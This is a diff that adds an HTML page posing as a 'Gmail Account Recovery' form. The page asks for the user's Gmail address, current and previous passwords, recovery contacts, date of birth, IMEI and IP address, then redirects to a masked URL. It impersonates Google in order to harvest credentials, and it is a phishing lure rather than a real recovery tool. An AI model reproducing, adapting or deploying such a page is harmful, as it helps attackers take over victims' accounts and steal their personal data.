@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GML</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .form-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 88%;
+            max-width: 500px;
+        }
+        .form-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #28a745; /* Green color for title */
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #000000;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s ease;
+            color: #000000;
+        }
+        .form-group input:focus, .form-group select:focus {
+            border-color: green;
+        }
+        .form-group input::placeholder {
+            color: #000000;
+            opacity: 0.7; /* Reduced opacity for placeholder text */
+        }
+        .form-group input[type="submit"] {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            padding: 12px;
+        }
+        .form-group input[type="submit"]:hover {
+            background-color: #218838;
+        }
+        .password-container {
+            position: relative;
+        }
+        .password-container input {
+            padding-right: 40px;
+        }
+        .password-container .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 70%; /* Adjusted to move the icon further down */
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 20px;
+            user-select: none;
+            color: #000000;
+        }
+        .imei-group, .previous-password-group {
+            display: none;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        .optional {
+            color: green;
+            font-size: 12px;
+            opacity: 0.7;
+        }
+        .proceed-button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            padding: 12px;
+            width: 100%;
+            text-align: center;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+        .proceed-button:hover {
+            background-color: #218838;
+        }
+        @media (max-width: 600px) {
+            .form-container {
+                padding: 15px;
+            }
+            .form-group input, .form-group select {
+                padding: 8px;
+                font-size: 14px;
+            }
+            .form-group input[type="submit"] {
+                padding: 10px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <h2>Gmail Account Recovery</h2>
+    <form onsubmit="handleSubmit(event)">
+        <!-- Gmail ID Section -->
+        <div class="form-group">
+            <label for="gmailId">Gmail ID</label>
+            <input type="email" id="gmailId" name="gmailId" placeholder="Enter your Gmail ID" required>
+            <div class="error-message" id="emailError">Invalid email address.</div>
+        </div>
+
+        <!-- Gmail ID Full Name Section (Optional) -->
+        <div class="form-group">
+            <label for="gmailFullName">Gmail ID Full Name <span class="optional">(Optional)</span></label>
+            <input type="text" id="gmailFullName" name="gmailFullName" placeholder="Enter your Gmail ID full name">
+        </div>
+
+        <!-- Old Password Section -->
+        <div class="form-group password-container">
+            <label for="oldPassword">Old Password</label>
+            <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" minlength="6" required>
+            <span class="toggle-password" id="togglePassword">👁️</span>
+        </div>
+
+        <!-- One More Previous Password Section (Optional) -->
+        <div class="form-group previous-password-group" id="previousPasswordGroup">
+            <label for="previousPassword">One More Previous Password <span class="optional">(Optional)</span></label>
+            <input type="password" id="previousPassword" name="previousPassword" placeholder="One More Previous Password">
+        </div>
+
+        <!-- Recovery Phone Number Section (Optional) -->
+        <div class="form-group">
+            <label for="recoveryPhone">Recovery Phone Number <span class="optional">(Optional)</span></label>
+            <input type="tel" id="recoveryPhone" name="recoveryPhone" placeholder="Enter your recovery phone number">
+        </div>
+
+        <!-- Recovery Email ID Section (Optional) -->
+        <div class="form-group">
+            <label for="recoveryEmail">Recovery Email ID <span class="optional">(Optional)</span></label>
+            <input type="email" id="recoveryEmail" name="recoveryEmail" placeholder="Enter your recovery email ID">
+        </div>
+
+        <!-- Date of Birth Section (Optional) -->
+        <div class="form-group">
+            <label for="dob">Date of Birth <span class="optional">(Optional)</span></label>
+            <input type="date" id="dob" name="dob" placeholder="Enter your date of birth">
+        </div>
+
+        <!-- Operating System Section -->
+        <div class="form-group">
+            <label for="systemOS">Operating System</label>
+            <select id="systemOS" name="systemOS" onchange="toggleIMEIField()" required>
+                <option value="" disabled selected>Select OS</option>
+                <option value="Android">Android</option>
+                <option value="iOS">iOS</option>
+                <option value="Windows">Windows (PC)</option>
+                <option value="Linux">Linux</option>
+                <option value="Other">Other</option>
+            </select>
+        </div>
+
+        <!-- IMEI Number Section -->
+        <div class="form-group imei-group" id="imeiGroup">
+            <label for="imeiNumber">IMEI Number</label>
+            <input type="text" id="imeiNumber" name="imeiNumber" placeholder="Enter your IMEI number">
+        </div>
+
+        <!-- IP Address Section -->
+        <div class="form-group">
+            <label for="ipAddress">IP Address</label>
+            <input type="text" id="ipAddress" name="ipAddress" placeholder="Enter your IP address" required>
+        </div>
+
+        <!-- Add New Recovery Email ID Section (Optional) -->
+        <div class="form-group">
+            <label for="newEmail">Add New Recovery Email ID <span class="optional">(Optional)</span></label>
+            <input type="email" id="newEmail" name="newEmail" placeholder="Add new recovery email ID">
+        </div>
+
+        <!-- Add New Recovery Phone Number Section (Optional) -->
+        <div class="form-group">
+            <label for="newPhone">Add New Recovery Phone Number <span class="optional">(Optional)</span></label>
+            <input type="tel" id="newPhone" name="newPhone" placeholder="Add new recovery phone number">
+        </div>
+
+        <!-- Contact Email Section -->
+        <div class="form-group">
+            <label for="contactEmail">Contact Email</label>
+            <input type="email" id="contactEmail" name="contactEmail" placeholder="Enter your contact email" required>
+        </div>
+
+        <button type="submit" class="proceed-button">Proceed</button>
+    </form>
+</div>
+
+<script>
+    // Password Toggle Functionality
+    const togglePassword = document.getElementById("togglePassword");
+    const passwordInput = document.getElementById("oldPassword");
+
+    togglePassword.addEventListener('click', function () {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        this.textContent = type === 'password' ? '👁️' : '🙈';
+    });
+
+    // Show Previous Password Field when Old Password is entered (6 characters or more)
+    const oldPasswordInput = document.getElementById("oldPassword");
+    const previousPasswordGroup = document.getElementById("previousPasswordGroup");
+
+    oldPasswordInput.addEventListener('input', function () {
+        if (oldPasswordInput.value.trim().length >= 6) {
+            previousPasswordGroup.style.display = "block";
+        } else {
+            previousPasswordGroup.style.display = "none";
+        }
+    });
+
+    // Email Validation on Form Submission
+    const recoveryForm = document.querySelector("form");
+    const gmailIdInput = document.getElementById("gmailId");
+    const emailError = document.getElementById("emailError");
+
+    recoveryForm.addEventListener('submit', function (event) {
+        event.preventDefault(); // Prevent default form submission
+
+        // Validate email
+        if (!gmailIdInput.value.includes('@')) {
+            emailError.style.display = 'block';
+            return false;
+        } else {
+            emailError.style.display = 'none';
+        }
+
+        // If validation passes, redirect to the specified URL
+        window.location.href = "#############";
+    });
+
+    // Function to toggle IMEI field based on OS selection
+    function toggleIMEIField() {
+        const systemOS = document.getElementById("systemOS").value;
+        const imeiGroup = document.getElementById("imeiGroup");
+        if (systemOS === "Android" || systemOS === "iOS") {
+            imeiGroup.style.display = "block";
+        } else {
+            imeiGroup.style.display = "none";
+        }
+    }
+</script>
+
+</body>
+</html>
